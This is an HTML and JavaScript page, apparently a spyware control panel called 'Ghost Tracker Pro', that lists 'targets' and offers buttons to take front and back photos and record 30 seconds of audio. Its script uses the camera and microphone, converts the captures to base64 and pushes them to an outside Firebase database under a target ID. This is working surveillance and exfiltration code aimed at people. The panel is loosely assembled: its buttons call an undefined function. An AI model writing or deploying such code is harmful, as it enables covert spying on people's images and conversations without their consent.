<!DOCTYPE html>
<html>
<head>
    <title>Ghost Admin Pro - v3.5</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; height: 100vh; margin: 0; }
        #sidebar { width: 300px; border-right: 2px solid #0f0; padding: 20px; background: #050505; }
        #mapArea { flex: 1; position: relative; border-bottom: 2px solid #0f0; }
        #dataFeed { position: absolute; bottom: 0; width: 100%; height: 300px; background: #000; border-top: 2px solid #0f0; overflow-y: auto; padding: 10px; }
        .target-card { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; }
        .btn { width: 100%; padding: 10px; margin: 5px 0; font-weight: bold; cursor: pointer; border: none; }
        .btn-photo { background: #0f0; color: #000; }
        .btn-audio { background: #00ff00; color: #000; }
        .btn-delete { background: #800; color: #fff; }
        img { width: 150px; border: 1px solid #0f0; margin: 5px; }
    </style>
</head>
<body>

    <div id="sidebar">
        <h2 style="color: #0f0;">GHOST TRACKER PRO</h2>
        <input type="text" id="targetId" placeholder="Enter Target ID" style="width: 90%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px;">
        <hr>
        <button class="btn btn-photo" onclick="cmd('photo_front')">üì∑ FRONT PHOTO</button>
        <button class="btn btn-photo" onclick="cmd('photo_back')">üì∏ BACK PHOTO</button>
        <button class="btn btn-audio" onclick="cmd('audio')">üéôÔ∏è RECORD AUDIO (30s)</button>
        <button class="btn btn-delete">üóëÔ∏è DELETE TARGET</button>
        <div id="targetList"></div>
    </div>

    <div id="mapArea">
        <iframe id="mapFrame" width="100%" height="100%" frameborder="0"></iframe>
        <div id="dataFeed">
            <h3 style="border-bottom: 1px solid #0f0;">LIVE DATA FEED</h3>
            <div id="gallery"></div>
            <div id="audioList"></div>
        </div>
    </div>
<script>
    // Firebase Setup
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();

    // Fix: Static ID for testing (Aap random bhi kar sakte hain)
    var userId = "Target_4917"; 

    async function capturePhoto(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Image data ko base64 mein convert karna
            const imageData = canvas.toDataURL('image/jpeg', 0.5);
            db.ref('targets/' + userId + '/photos').push({ 
                image: imageData, 
                type: mode,
                time: new Date().toLocaleString() 
            });

            stream.getTracks().forEach(t => t.stop());
            console.log("Photo Uploaded!");
        } catch (err) { alert("Camera Error: " + err); }
    }

    // Audio recording 30 seconds
    async function recordAudio() {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
                db.ref('targets/' + userId + '/audios').push({ data: reader.result });
            };
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 30000);
    }
</script>
</body>
</html>

